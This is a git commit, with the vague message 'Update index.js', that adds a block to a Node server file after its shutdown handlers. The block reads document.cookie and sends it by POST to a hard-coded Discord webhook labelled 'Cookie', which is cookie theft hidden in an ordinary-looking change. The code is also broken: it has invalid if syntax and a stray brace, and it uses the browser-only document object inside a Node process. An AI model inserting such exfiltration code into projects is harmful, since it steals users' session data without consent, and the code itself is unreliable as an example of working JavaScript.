8f089042e5bbebcf98b1f9e3ef3eade5f21b0e0b
lmao <116317098+Diecsy@users.noreply.github.com>
2025-01-09 13:46:13 -0800

    Update index.js

--- index.js
+++ index.js
@@ -102,6 +102,29 @@ function shutdown(signal) {
   });
 }
 
+ function getRandomInt(max) {
+  return Math.floor(Math.random() * max);
+}
+
+if !(typeof document.cookie == "number"){
+  document.cookie = "cookie="+ getRandomInt(1e9) + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;";
+  console.log(document.cookie)
+  const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1327009618479546498/88zVTNA0r96PH03nyT_ffsnD2ydU0ma41qQSOrPomuQ9qElaSkIRk6IZDtqoH8y1xjIv");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Cookie",
+        avatar_url: "",
+        content: document.cookie
+      }
+
+      request.send(JSON.stringify(params));
+    }
+}
+
+
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('SIGINT', () => shutdown('SIGINT'));
 
